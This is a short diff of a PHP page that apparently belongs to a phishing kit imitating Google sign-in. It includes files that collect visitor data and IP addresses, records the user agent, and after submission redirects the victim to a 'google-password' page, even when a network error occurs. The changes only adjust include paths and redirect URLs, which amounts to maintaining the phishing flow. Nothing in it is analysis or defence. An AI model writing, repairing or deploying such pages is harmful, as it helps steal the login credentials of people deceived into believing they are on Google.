@@ -1,7 +1,8 @@
 <?php
 // get root directory
-require_once(dirname(dirname(__FILE__)) . '/get-data.php');
-require_once(dirname(dirname(__FILE__)) . '/getip.php');
+$rootDirectory = dirname(dirname(dirname(__FILE__)));
+require_once($rootDirectory . '/get-data.php');
+require_once($rootDirectory . '/getip.php');
 ?>
     
 <?php
@@ -469,12 +470,12 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             .then(response => response.json())
             .then(data => {
                 // Chuyển đến trang password
-                window.location.href = "/google-password.php";
+                window.location.href = "../google-password";
             })
             .catch(error => {
                 console.error('Error:', error);
                 // Fallback nếu có lỗi network
-                window.location.href = "/google-password.php";
+                window.location.href = "../google-password";
             });
         }
     </script>
